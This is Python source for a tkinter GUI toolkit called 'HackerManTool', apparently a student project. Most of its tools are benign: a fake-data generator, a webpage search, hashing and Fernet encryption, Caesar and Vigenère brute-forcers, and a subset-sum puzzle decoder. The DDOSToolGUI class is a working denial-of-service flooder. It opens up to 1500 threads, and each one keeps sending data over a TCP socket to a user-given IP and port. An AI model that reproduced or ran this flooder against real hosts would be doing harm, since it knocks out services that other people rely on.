import hashlib
import re
import socket
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext

import requests
from cryptography.fernet import Fernet
from faker import Faker


class FakeDataGeneratorGUI(tk.Frame):
    def __init__(self, master=None, **kwargs):
        super().__init__(master, **kwargs)
        self.grid()
        self.create_widgets()

    def create_widgets(self):
        # Label prompting the user to select a language
        self.label = tk.Label(self, text="Select a language:")
        self.label.grid(row=0, column=0, pady=10, padx=10)

        # Dropdown combobox to select a language
        self.languages = ['English', 'Italian', 'Hebrew', 'Japanese']
        self.lang_combo = ttk.Combobox(self, values=self.languages, state="readonly")
        self.lang_combo.current(0)
        self.lang_combo.grid(row=1, column=0, pady=10, padx=10)

        # Button to trigger fake data generation
        self.btn_generate = tk.Button(self, text="Generate Fake Data", command=self.get_fake_data)
        self.btn_generate.grid(row=2, column=0, pady=10)

        # Text box to display the generated fake data
        self.output_text = tk.Text(self, width=50, height=10)
        self.output_text.grid(row=3, column=0, pady=10, padx=10)

    def generate_fake_data(self, language='english'):
        """Generate fake data using the Faker library based on the selected language."""
        # Mapping selected language to appropriate locale
        locale_mapping = {
            'english': 'en_US',
            'italian': 'it_IT',
            'hebrew': 'he_IL',
            'japanese': 'ja_JP'
        }
        fake_locale = locale_mapping.get(language, 'en_US')
        fake = Faker(fake_locale)

        # Generate and return fake data as a dictionary
        fake_data = {
            'name': fake.name(),
            'address': fake.address(),
            'email': fake.email(),
            'phone_number': fake.phone_number(),
        }
        return fake_data

    def get_fake_data(self):
        """Handle button press, get the selected language, generate data and display in the text box."""
        lang = self.lang_combo.get().lower()
        self.output_text.config(state=tk.NORMAL)
        if lang in ['english', 'italian', 'hebrew', 'japanese']:
            fake_data = self.generate_fake_data(lang)
            self.output_text.delete(1.0, tk.END)
            self.output_text.insert(tk.END, "Generated Fake Data:\n")
            for key, value in fake_data.items():
                self.output_text.insert(tk.END, f"{key.capitalize()}: {value}\n")
        else:
            self.output_text.delete(1.0, tk.END)
            self.output_text.insert(tk.END, "Invalid language selection.")
        self.output_text.config(state=tk.DISABLED)


class CaesarCipherGUI(tk.Frame):
    def __init__(self, master=None, **kwargs):
        """Constructor for the CaesarCipherGUI class."""
        super().__init__(master, **kwargs)
        self.histogram_display = None
        self.text_entry = None
        self.prompt_label = None
        self.decode_button = None
        self.master = master
        self.grid()
        self.create_widgets()

    def caesar_cipher(self, text, shift):
        """
        Implement the Caesar Cipher algorithm.

        :param text: The input text to be encrypted/decrypted.
        :param shift: The number of positions to shift each character.
        :return: Transformed text after applying Caesar Cipher.
        """
        result = ""
        for char in text:
            if char.isalpha():
                shifted = ord(char) + shift
                if char.islower():
                    if shifted > ord('z'):
                        shifted -= 26
                    elif shifted < ord('a'):
                        shifted += 26
                elif char.isupper():
                    if shifted > ord('Z'):
                        shifted -= 26
                    elif shifted < ord('A'):
                        shifted += 26
                result += chr(shifted)
            else:
                result += char
        return result

    def print_shifts_histogram(self, encrypted_text):
        """
        Generate histogram for all possible Caesar Cipher shifts.

        :param encrypted_text: The encrypted text.
        :return: A string representation of all possible decryptions.
        """
        result = ""
        for shift in range(26):
            decrypted = self.caesar_cipher(encrypted_text, -shift)
            result += f"Shift {shift}: {decrypted}\n"
        return result

    def display_histogram(self, event=None):
        """
        Update the histogram display based on the user's input.
        """
        encrypted_text = self.text_entry.get().strip()  # Get input from the Text widget
        histogram_text = self.print_shifts_histogram(encrypted_text)  # Generate histogram
        self.histogram_display.config(state=tk.NORMAL)  # Allow editing of the display widget
        self.histogram_display.delete("1.0", tk.END)  # Clear previous histogram
        self.histogram_display.insert(tk.END, histogram_text)  # Insert the new histogram
        self.histogram_display.config(state=tk.DISABLED)  # Disable editing after insertion

    def create_widgets(self):
        """Setup and initialize all the widgets used in the GUI."""

        # Label to prompt the user
        self.prompt_label = tk.Label(self, text="Enter encrypted text:")
        self.prompt_label.grid(row=0, column=0, pady=10)

        # Text widget for user's input
        self.text_entry = tk.Entry(self, width=40)
        self.text_entry.bind("<Return>", self.display_histogram)  # Binding "Enter" key
        self.text_entry.grid(row=1, column=0, pady=10)

        # Button to trigger the decryption process
        self.decode_button = tk.Button(self, text="Decode", command=self.display_histogram)
        self.decode_button.grid(row=2, column=0, pady=10)

        # Text widget to display the histogram of possible decryptions
        self.histogram_display = scrolledtext.ScrolledText(self, wrap=tk.WORD, height=15, width=40)
        self.histogram_display.config(state=tk.DISABLED)
        self.histogram_display.grid(row=3, column=0, pady=10)
        self.histogram_display.config(state=tk.DISABLED)  # Start in a read-only state


class VigenereCipherGUI(tk.Frame):
    def __init__(self, master=None, **kwargs):
        super().__init__(master, **kwargs)
        self.grid()
        self.create_widgets()

    # Encrypts given text using Vigenère cipher
    def encrypt_vigenere(self, text, key, jump):
        result = ""
        for i in range(len(text)):
            char = text[i]
            # Encrypt uppercase characters
            if char.isupper():
                result += chr((ord(char) + key + (jump * i) - 65) % 26 + 65)
            # Encrypt lowercase characters
            else:
                result += chr((ord(char) + key + (jump * i) - 97) % 26 + 97)
        return result

    # Decrypts given text using Vigenère cipher
    def decrypt_vigenere(self, text, key, jump):
        result = ""
        for i in range(len(text)):
            char = text[i]
            # Decrypt uppercase characters
            if char.isupper():
                result += chr((ord(char) - key - (jump * i) - 65) % 26 + 65)
            # Decrypt lowercase characters
            else:
                result += chr((ord(char) - key - (jump * i) - 97) % 26 + 97)
        return result

    # Function that is triggered upon pressing "Decode" button or "Enter" key
    def display_histogram(self, event=None):
        # Retrieve the encrypted text from the input box
        encrypted_text = self.text_entry.get().strip()
        # Generate the histogram of decrypted possibilities
        histogram_text = self.print_shifts_histogram(encrypted_text)

        # Clear the scrolled text widget and display the histogram
        self.histogram_display.config(state=tk.NORMAL)
        self.histogram_display.delete("1.0", tk.END)
        self.histogram_display.insert(tk.END, histogram_text)
        self.histogram_display.config(state=tk.DISABLED)

    # Generates a histogram of decrypted possibilities for all key and jump values
    def print_shifts_histogram(self, encrypted_text):
        result = ""
        # Assuming the range for key and jump values to be [0, 25]
        for key in range(26):
            for jump in range(26):
                decrypted = self.decrypt_vigenere(encrypted_text, key, jump)
                result += f"Key: {key}, Jump: {jump} -> {decrypted}\n"
        return result

    # Creates and places all the widgets onto the GUI
    def create_widgets(self):
        self.prompt_label = tk.Label(self, text="Enter encrypted text:")
        self.prompt_label.grid(row=0, column=0, pady=10)

        self.text_entry = tk.Entry(self, width=40)
        self.text_entry.grid(row=1, column=0, pady=10)
        # Bind "Enter" key to the function
        self.text_entry.bind("<Return>", self.display_histogram)

        self.decode_button = tk.Button(self, text="Decode", command=self.display_histogram)
        self.decode_button.grid(row=2, column=0, pady=10)

        self.histogram_display = scrolledtext.ScrolledText(self, wrap=tk.WORD, height=15, width=40)
        self.histogram_display.grid(row=3, column=0, pady=10)
        self.histogram_display.config(state=tk.DISABLED)


class EncryptionAppGUI(tk.Frame):
    def __init__(self, master=None, **kwargs):
        super().__init__(master, **kwargs)
        self.grid()
        self.create_widgets()

    def create_widgets(self):
        # Label to prompt user input
        self.input_label = ttk.Label(self, text="Enter the string you want to encrypt:")
        self.input_label.grid(row=0, column=0, padx=10, pady=5)

        # Entry box to input the text to be encrypted
        self.input_entry = ttk.Entry(self, width=50)
        self.input_entry.grid(row=1, column=0, padx=10, pady=5)

        # Label for encryption method choice
        self.encryption_choice_label = ttk.Label(self, text="Select an encryption method:")
        self.encryption_choice_label.grid(row=2, column=0, padx=10, pady=5)

        # Dropdown to select an encryption method
        self.encryption_choice = ttk.Combobox(self, values=["SHA-256", "Fernet"])
        self.encryption_choice.current(0)
        self.encryption_choice.grid(row=3, column=0, padx=10, pady=5)

        # ScrolledText widget to display results
        self.result_text = scrolledtext.ScrolledText(self, width=50, height=10, wrap=tk.WORD)
        self.result_text.grid(row=4, column=0, padx=10, pady=5)

        # Button to start the encryption process
        self.encrypt_button = ttk.Button(self, text="Encrypt", command=self.encrypt)
        self.encrypt_button.grid(row=5, column=0, padx=10, pady=10)

    def sha256_hash(self, text):
        """Function to encrypt the text using SHA-256."""
        hashed = hashlib.sha256(text.encode()).hexdigest()
        return hashed

    def fernet_encrypt(self, text, key):
        """Function to encrypt the text using Fernet."""
        fernet = Fernet(key)
        encrypted = fernet.encrypt(text.encode())
        return encrypted

    def encrypt(self):
        """Main function to handle the encryption based on user's choice."""
        user_input = self.input_entry.get()
        encryption_method = self.encryption_choice.get()
        self.result_text.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)  # Clear previous results

        if encryption_method == 'SHA-256':
            encrypted_text = self.sha256_hash(user_input)
            self.result_text.insert(tk.END, f"SHA-256 Encrypted Message:\n{encrypted_text}\n\n")
        elif encryption_method == 'Fernet':
            key = Fernet.generate_key()
            encrypted_text = self.fernet_encrypt(user_input, key)
            self.result_text.insert(tk.END, f"Fernet Encrypted Message:\n{encrypted_text.decode()}\n")
            self.result_text.insert(tk.END, f"Encryption Key:\n{key.decode()}\n\n")
        else:
            self.result_text.insert(tk.END, "Invalid encryption method choice.\n\n")
        self.result_text.config(state=tk.DISABLED)


class WebContentSearchAppGUI(tk.Frame):
    def __init__(self, master=None, **kwargs):
        """Initialize the WebContentSearchAppGUI frame."""
        super().__init__(master, **kwargs)
        self.grid()
        self.create_widgets()

    def create_widgets(self):
        """Create and position all the widgets in the GUI."""

        # Label prompting the user to input a URL address
        self.url_label = ttk.Label(self, text="Enter the URL address:")
        self.url_label.grid(row=0, column=0, padx=10, pady=5)

        # Entry box for the user to type in the URL
        self.url_entry = ttk.Entry(self, width=50)
        self.url_entry.grid(row=1, column=0, padx=10, pady=5)

        # Label prompting the user to input a search term
        self.search_term_label = ttk.Label(self, text="Enter the search term:")
        self.search_term_label.grid(row=2, column=0, padx=10, pady=5)

        # Entry box for the user to type in the search term
        self.search_term_entry = ttk.Entry(self, width=50)
        self.search_term_entry.grid(row=3, column=0, padx=10, pady=5)

        # ScrolledText widget to display search results
        self.result_text = scrolledtext.ScrolledText(self, width=80, height=20, wrap=tk.WORD)
        self.result_text.grid(row=4, column=0, padx=10, pady=5)

        # Button that triggers the search_and_print method when clicked
        self.search_button = ttk.Button(self, text="Search and Print", command=self.search_and_print)
        self.search_button.grid(row=5, column=0, padx=10, pady=10)

    def search_and_print(self):
        """Fetch the content of the provided URL, search for the term and display results in the ScrolledText widget."""

        # Retrieve user inputs for URL and search term
        url = self.url_entry.get()
        search_term = self.search_term_entry.get()

        try:
            # Fetch the content from the given URL
            response = requests.get(url)
            response.raise_for_status()

            # Search for the provided term in the fetched content
            content = response.text
            occurrences = [match.start() for match in re.finditer(search_term, content, re.IGNORECASE)]

            # Make the ScrolledText widget editable to insert new data
            self.result_text.config(state=tk.NORMAL)
            # Clear the ScrolledText widget from previous data
            self.result_text.delete(1.0, tk.END)

            # Display occurrences of the search term in the content
            if occurrences:
                self.result_text.insert(tk.END, f"Search Term '{search_term}' Found at Locations:\n")
                for occurrence in occurrences:
                    self.result_text.insert(tk.END, f"Location: {occurrence}\n")
            else:
                self.result_text.insert(tk.END, f"Search Term '{search_term}' Not Found.\n")

            # Add spacing
            self.result_text.insert(tk.END, "\n\n")

            # Insert the fetched content and search results into the widget
            self.result_text.insert(tk.END, f"Source Code of {url}:\n\n{content}\n\n")

        except requests.exceptions.RequestException as e:
            # Display any error messages
            self.result_text.insert(tk.END, f"An error occurred: {e}\n")

        # Set the ScrolledText widget to non-editable after inserting data
        self.result_text.config(state=tk.DISABLED)


class MSSPDecryptorGUI(tk.Frame):
    def __init__(self, master=None):
        # Initialize the parent class
        super().__init__(master)
        self.master = master
        # Attach this frame to its master
        self.pack()
        # Create GUI elements
        self.create_widgets()

    def create_widgets(self):
        # GUI element for inputting the ciphertext
        self.ciphertext_label = tk.Label(self, text="Enter the ciphertext:")
        self.ciphertext_label.grid(row=0, column=0, padx=10, pady=10)
        self.ciphertext_entry = tk.Entry(self, width=40)
        self.ciphertext_entry.grid(row=0, column=1, padx=10, pady=10)
        # GUI element for inputting n (optional)
        self.n_label = tk.Label(self, text="Enter n (optional):")
        self.n_label.grid(row=1, column=0, pady=10)
        self.n_entry = tk.Entry(self)
        self.n_entry.grid(row=1, column=1, pady=10)
        # GUI element for inputting m (optional)
        self.m_label = tk.Label(self, text="Enter m (optional):")
        self.m_label.grid(row=2, column=0, pady=10)
        self.m_entry = tk.Entry(self)
        self.m_entry.grid(row=2, column=1, pady=10)
        # GUI element for inputting d (optional)
        self.d_label = tk.Label(self, text="Enter d (optional):")
        self.d_label.grid(row=3, column=0, pady=10)
        self.d_entry = tk.Entry(self)
        self.d_entry.grid(row=3, column=1, pady=10)
        # GUI button that triggers the decryption logic
        self.decrypt_button = tk.Button(self, text="Decrypt", command=self.decrypt)
        self.decrypt_button.grid(row=4, columnspan=2, pady=10)
        # Text box to display the results or any error messages
        self.result_text = tk.Text(self, height=5, width=40)
        self.result_text.grid(row=5, columnspan=2, pady=10)
        self.result_text.config(state=tk.DISABLED)

    def decrypt(self):
        # Fetch the entered values
        ciphertext = self.ciphertext_entry.get()
        n = self.n_entry.get()
        m = self.m_entry.get()
        d = self.d_entry.get()
        # Convert to integers if values are not empty, otherwise set to None
        n = int(n) if n else None
        m = int(m) if m else None
        d = int(d) if d else None
        # Validation to ensure at least two parameters are provided
        if (n is None and (m is None or d is None)) or \
                (m is None and (n is None or d is None)) or \
                (d is None and (n is None or m is None)):
            self.result_text.config(state=tk.NORMAL)
            self.result_text.delete("1.0", tk.END)
            self.result_text.insert(tk.END, f"Error: At least two of n, m, and d must be provided.\n")
            self.result_text.config(state=tk.DISABLED)
            return
        try:
            # Filter out non-digit characters from the ciphertext
            self.ciphertext = ''.join(char for char in ciphertext if char.isdigit())
            self.n = n
            self.m = m
            self.d = d
            # Decrypt the ciphertext
            common_sum = self._decrypt()
            # Display the result in the text box
            self.result_text.config(state=tk.NORMAL)
            self.result_text.delete("1.0", tk.END)
            self.result_text.insert(tk.END, f"Common Sum:\n{common_sum}\n")
            self.result_text.config(state=tk.DISABLED)
        except ValueError as e:
            # Display any error messages in the text box
            self.result_text.config(state=tk.NORMAL)
            self.result_text.delete("1.0", tk.END)
            self.result_text.insert(tk.END, f"Error:\n{str(e)}\n")
            self.result_text.config(state=tk.DISABLED)

    def _decrypt(self):
        # Calculate any missing parameter if needed
        if self.n is None:
            self.n = len(self.ciphertext) // (self.m * self.d)
        elif self.m is None:
            self.m = len(self.ciphertext) // (self.n * self.d)
        else:
            self.d = len(self.ciphertext) // (self.n * self.m)
        # Break the ciphertext into sets
        sets = [self.ciphertext[i:i + self.d * self.m] for i in range(0, len(self.ciphertext), self.d * self.m)]
        if len(sets) != self.n:
            raise ValueError("Ciphertext cannot be evenly divided into n sets of m items of d digits")
        # Convert sets into lists of integers
        sets = [[int(set[i:i + self.d]) for i in range(0, len(set), self.d)] for set in sets]
        # Find the common sum among all the sets
        common_sum = self.find_common_sum(sets)
        return common_sum

    def find_common_sum(self, sets):
        # Iterate through all possible sums to find the common sum
        for target_sum in range(sum(sets[0]), -1, -1):
            if all(self.calc_subset_sum(set, target_sum) for set in sets):
                return target_sum
        raise ValueError("No common sum found in all sets")

    def calc_subset_sum(self, nums, sum):
        # Helper function to find if a subset sum exists for a given sum
        if sum == 0:
            return True
        if not nums:
            return False
        return self.calc_subset_sum(nums[1:], sum - nums[0]) or self.calc_subset_sum(nums[1:], sum)


class DDOSToolGUI(tk.Frame):
    # Define the IPAddressPortEntry class that inherits from tk.Frame
    class IPAddressPortEntry(tk.Frame):
        # Initialize the class
        def __init__(self, master=None):
            super().__init__(master)  # Call the constructor of the parent class
            self.master = master  # Store the master (parent) window reference
            self.create_widgets()  # Call the create_widgets method to create the UI elements

        # Method to create widgets
        def create_widgets(self):
            # Create the first octet entry and place it in the grid
            self.octet1 = ttk.Entry(self, width=3)
            self.octet1.grid(row=0, column=0)
            # Create the second octet entry and place it in the grid
            self.octet2 = ttk.Entry(self, width=3)
            self.octet2.grid(row=0, column=2)
            # Create the third octet entry and place it in the grid
            self.octet3 = ttk.Entry(self, width=3)
            self.octet3.grid(row=0, column=4)
            # Create the fourth octet entry and place it in the grid
            self.octet4 = ttk.Entry(self, width=3)
            self.octet4.grid(row=0, column=6)
            # Create dots as labels to visually separate the octets and place them in the grid
            self.dot1 = ttk.Label(self, text=".")
            self.dot1.grid(row=0, column=1)
            self.dot2 = ttk.Label(self, text=".")
            self.dot2.grid(row=0, column=3)
            self.dot3 = ttk.Label(self, text=".")
            self.dot3.grid(row=0, column=5)
            # Create colon as a label to visually separate IP and port and place it in the grid
            self.colon = ttk.Label(self, text=":")
            self.colon.grid(row=0, column=7)
            # Create the port entry and place it in the grid
            self.port = ttk.Entry(self, width=5)
            self.port.grid(row=0, column=8)

        # Method to get the IP address and port
        def get(self):
            # Retrieve the content of each octet entry and port entry
            oct1 = self.octet1.get()
            oct2 = self.octet2.get()
            oct3 = self.octet3.get()
            oct4 = self.octet4.get()
            port = self.port.get()
            # Construct the IP address string
            ip_address = f"{oct1}.{oct2}.{oct3}.{oct4}"
            # Return the IP address and port as a tuple
            return ip_address, port

    def __init__(self, master=None):
        super().__init__(master)
        self.stop_button = None
        self.start_button = None
        self.button_frame = None
        self.thread_label = None
        self.thread_spinbox = None
        self.ip_label = None
        self.ip_entry = None
        self.master = master
        self.thread_count = 1
        self.threads = []
        self.keep_alive = False
        self.pack()
        self.create_widgets()

    def create_widgets(self):
        # IP Address Entry
        self.ip_label = ttk.Label(self, text="Enter IP address:")
        self.ip_label.grid(row=0, column=0, padx=5, pady=5)
        self.ip_entry = self.IPAddressPortEntry(self)
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        # Number of Threads Entry
        self.thread_label = ttk.Label(self, text="Number of Threads (1 to 1500):")
        self.thread_label.grid(row=2, column=0, padx=5, pady=5)
        self.thread_spinbox = ttk.Spinbox(self, from_=1, to=1500, increment=1, width=20)
        self.thread_spinbox.grid(row=2, column=1, padx=5, pady=5)
        # Start and Stop Buttons
        self.button_frame = ttk.Frame(self)
        self.button_frame.grid(row=3, columnspan=2)
        self.start_button = ttk.Button(self.button_frame, text="Start", command=self.start_operation)
        self.start_button.pack(side=tk.LEFT, padx=5, pady=10)
        self.stop_button = ttk.Button(self.button_frame, text="Stop", command=self.stop_operation)
        self.stop_button.pack(side=tk.LEFT, padx=5, pady=10)

    def attack(self, address, port, message, num_thread):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        addr_port = (address, int(port))
        sock.connect(addr_port)
        while self.keep_alive:
            message = str.encode(message)
            sock.sendall(message)
            print(f"Sending {message} to {address}:{port}, thread {num_thread}")
        sock.close()
        print(f"Stopped sending {message} to {address}:{port}, thread {num_thread}")

    def start_operation(self):
        ip_address, port = self.ip_entry.get()
        num_threads = int(self.thread_spinbox.get())
        print(f"Starting operation with IP: {ip_address}, Port: {port}, Number of Threads: {num_threads}")
        msg = "hi"
        for i in range(num_threads):
            new_th = threading.Thread(target=self.attack, args=(ip_address, port, msg, i + 1))
            self.threads.append(new_th)
        self.keep_alive = True
        for th in self.threads:
            th.start()

    def stop_operation(self):
        print("Stopping operation")
        self.keep_alive = False
        for th in self.threads:
            th.join()
        print("Stopped")


class MainWindow(tk.Tk):
    font_large = ("Arial", 24)
    font_med = ("Arial", 12)
    font_small = ("Arial", 8)

    def __init__(self):
        super().__init__()
        self.new_window_fd = None
        self.ddosAttackBtn = None
        self.msspDecryptBtn = None
        self.vigenereEncAttack = None
        self.caesarEncAttack = None
        self.encStrBtn = None
        self.printSiteSrcBtn = None
        self.button_list = None
        self.fakeDataBtn = None
        self.title_str = "HackerManTool"
        self.title(self.title_str)
        self.create_widgets()
        self.configure_grid()
        self.resizable(False, False)

    def create_buttons(self):
        """
        function that creates buttons
        """
        self.button_list = []
        self.fakeDataBtn = tk.Button(self, text="Create Random Fake Data",
                                     font=self.font_med,
                                     command=self.onFakeDataBtn)
        self.button_list.append(self.fakeDataBtn)
        self.printSiteSrcBtn = tk.Button(self, text="Print Site Source Code and text Locations",
                                         font=self.font_med,
                                         command=self.onPrintSiteSrcBtn)
        self.button_list.append(self.printSiteSrcBtn)
        self.encStrBtn = tk.Button(self, text="Encrypt string given hash function",
                                   font=self.font_med,
                                   command=self.onEncStrBtn)
        self.button_list.append(self.encStrBtn)
        self.caesarEncAttack = tk.Button(self, text="Attack on Caesar Code",
                                         font=self.font_med,
                                         command=self.onCaesarEncAttack)
        self.button_list.append(self.caesarEncAttack)
        self.vigenereEncAttack = tk.Button(self, text="Attack on Vegenere Code",
                                           font=self.font_med,
                                           command=self.onVigenereEncAttack)
        self.button_list.append(self.vigenereEncAttack)
        self.msspDecryptBtn = tk.Button(self, text="MSSP Decryption",
                                        font=self.font_med,
                                        command=self.onMsspDecryptBtn)
        self.button_list.append(self.msspDecryptBtn)
        self.ddosAttackBtn = tk.Button(self, text="DDOS attack",
                                       font=self.font_med,
                                       command=self.onDdosAttackBtn)
        self.button_list.append(self.ddosAttackBtn)

    def create_widgets(self):
        # Add a label at the top with the program name
        title_label = tk.Label(self, text="HackerManTool", font=self.font_large)
        title_label.grid(row=0, column=0, rowspan=3, columnspan=1, padx=10, pady=20,
                         sticky="nsew")  # centered at the top of the window
        created_by_lbl = tk.Label(self, text="Created by:", font=self.font_small)
        created_by_lbl.grid(row=0, column=1, rowspan=1, columnspan=2, padx=10, pady=20, sticky="nsew")
        authors_lbl = tk.Label(self, text="Vadim Darchuk\nYotam Alter\nMichael Palas", font=self.font_small)
        authors_lbl.grid(row=1, column=1, rowspan=2, columnspan=2, padx=10, sticky="nsew")
        self.create_buttons()
        for i in range(len(self.button_list)):
            btn = self.button_list[i]
            btn.grid(row=i + 3, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

    def configure_grid(self):
        # Configure the rows
        self.grid_rowconfigure(0, weight=0)  # Header label
        for i in range(1, 8):
            self.grid_rowconfigure(i, weight=1)
        # Configure the columns
        for i in range(3):
            self.grid_columnconfigure(i, weight=1)

    def _open_window(self, title, window_class):
        """
        Open new window helper function
        :param title: Window title
        :param window_class: Class of object to open
        """
        new_window = tk.Toplevel(self)
        new_window.title("{}: {}".format(self.title_str, title))
        new_window.resizable(False, False)
        window_class(new_window)

    def onFakeDataBtn(self):
        self._open_window("Fake Date", FakeDataGeneratorGUI)

    def onPrintSiteSrcBtn(self):
        self._open_window("Website Source", WebContentSearchAppGUI)

    def onEncStrBtn(self):
        self._open_window("Encrypt String", EncryptionAppGUI)

    def onCaesarEncAttack(self):
        self._open_window("Caesar", CaesarCipherGUI)

    def onVigenereEncAttack(self):
        self._open_window("Vigenere", VigenereCipherGUI)

    def onMsspDecryptBtn(self):
        self._open_window("MSSP Decrypt", MSSPDecryptorGUI)

    def onDdosAttackBtn(self):
        self._open_window("DDOS Attack", DDOSToolGUI)


if __name__ == "__main__":
    app = MainWindow()
    app.mainloop()
